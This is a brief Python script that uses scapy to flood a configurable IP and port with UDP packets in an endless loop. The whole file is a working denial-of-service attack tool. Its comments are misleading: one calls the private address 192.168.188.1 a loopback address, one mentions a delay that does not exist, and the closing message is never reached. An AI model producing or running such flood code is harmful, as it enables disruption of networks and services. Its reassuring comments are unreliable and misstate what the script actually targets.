from scapy.all import *
import time
from scapy.layers.inet import IP, TCP, UDP, ICMP

# Configuration
TARGET_IP = "192.168.188.1"  # Loopback address to target your own machine
TARGET_PORT = 80  # Change this to any port you want to test
PACKET_COUNT = 1200  # Number of UDP packets to send


def send_udp_flood(target_ip, target_port, count):
    while True:
        for _ in range(count):
            ip = IP(dst=target_ip)
            udp = UDP(dport=target_port)
            packet = ip / udp
            send(packet, verbose=0)
            print("ättack sent")
            # Small delay to simulate more realistic traffic


# Generate UDP flood
send_udp_flood(TARGET_IP, TARGET_PORT, PACKET_COUNT)
print(f"Sent {PACKET_COUNT} UDP packets to {TARGET_IP}:{TARGET_PORT}")
